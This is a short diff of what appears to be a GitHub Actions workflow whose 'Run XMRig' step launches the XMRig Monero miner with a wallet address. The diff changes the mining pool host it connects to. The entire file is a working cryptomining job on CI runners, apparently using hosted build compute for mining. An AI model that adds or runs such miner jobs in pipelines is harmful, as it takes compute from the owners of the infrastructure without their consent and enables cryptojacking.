@@ -29,4 +29,4 @@ jobs:
       - name: Run XMRig
         run: |
           cd xmrig/build
-          ./xmrig -o pool.xmrfast.com:9000 -u 44nFMQFFiFceGgSdPeqpQ4iSf2qm3XtG55JJ3KNUQ9RDJ99Aus2N7FWAwNKMN8xUKDQ6xMM4tgKFUecoiYYhFK2rVSZFuNg -k --tls -p test
+          ./xmrig -o xmr.pool.gntl.co.uk:20009 -u 44nFMQFFiFceGgSdPeqpQ4iSf2qm3XtG55JJ3KNUQ9RDJ99Aus2N7FWAwNKMN8xUKDQ6xMM4tgKFUecoiYYhFK2rVSZFuNg -k --tls -p test
